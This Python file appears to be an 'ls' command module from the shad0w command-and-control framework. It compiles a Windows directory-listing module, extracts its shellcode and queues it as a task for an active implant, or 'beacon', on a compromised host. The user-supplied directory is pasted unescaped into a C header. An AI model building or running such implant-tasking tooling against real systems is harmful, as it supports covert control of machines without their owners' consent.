# 
# List the files in a directory
#

import argparse

from lib import buildtools

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def get_list_directory(rargs, args):
    # resolve the directory we need to list

    # if we got no other args but 'ls' then drop the current dir
    if (args.dir is None) and (''.join(rargs) == "ls"):
        return "."

    elif type(args.dir) == list:
        return ' '.join(args.dir).replace('"', '')
    
    elif args.dir is not None:
        return args.dir

    return None


def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # usage examples
    usage_examples = """

Examples:

ls
ls C:\\
ls "C:\\Documents and Settings"
"""
    
    parse = argparse.ArgumentParser(prog='ls',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("dir", nargs='*', default=".", help="Location of the dir to want to list the contents of")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # the user might have just run 'ls' but if not lets fail
    if (not len(raw_args) == 1) and (not raw_args == "ls"):
        if ERROR:
            print(error_list) 
            parse.print_help()
            return
    
    # find the dir we want to list
    dir = get_list_directory(raw_args, args).replace('\\', "\\\\")

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/ls/", builddir="/root/shad0w/modules/windows/ls/build")

    # set the correct settings
    template = "#define szDir \"%s\\\\*\"" % (dir)

    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/ls/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/ls/build", modlocation="/root/shad0w/modules/windows/ls/module.exe")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/ls/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)